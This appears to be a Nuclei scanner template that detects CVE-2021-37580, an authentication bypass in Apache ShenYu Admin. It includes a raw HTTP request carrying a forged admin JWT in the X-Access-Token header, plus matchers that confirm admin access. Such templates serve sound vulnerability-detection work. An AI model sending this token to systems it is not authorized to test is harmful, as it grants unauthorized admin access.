id: CVE-2021-37580
info:
  name: Apache ShenYu Admin JWT - Authentication Bypass
  author: pdteam
  severity: critical
  description: Apache ShenYu versions 2.3.0 and 2.4.0 suffer from an authentication
    bypass vulnerability (CVE-2021-37580) that allows attackers to gain admin access
    due to incorrect use of JWT in ShenyuAdminBootstrap.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-37580
  - https://github.com/fengwenhua/CVE-2021-37580
  - https://lists.apache.org/thread/o15j25qwtpcw62k48xw1tnv48skh3zgb
  - http://www.openwall.com/lists/oss-security/2021/11/16/1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-37580
    cwe-id: CWE-287
  tags: cve,cve2021,apache,jwt,shenyu
  metadata:
    impact: The impact of CVE-2021-37580 is that an attacker can gain unauthorized
      access to Apache ShenYu 2.3.0 and 2.4.0 Admin without proper authentication,
      due to an authentication bypass caused by the incorrect use of JWT in ShenyuAdminBootstrap.
    recommendation: It is recommended that Apache ShenYu administrators immediately
      update to version 2.4.1 to prevent an attacker from exploiting CVE-2021-37580
      and bypassing authentication.
requests:
- raw:
  - 'GET /dashboardUser HTTP/1.1

    Host: {{Hostname}}

    X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - query success
    - '"userName":"admin"'
    - '"code":200'
    condition: and
  - type: status
    status:
    - 200
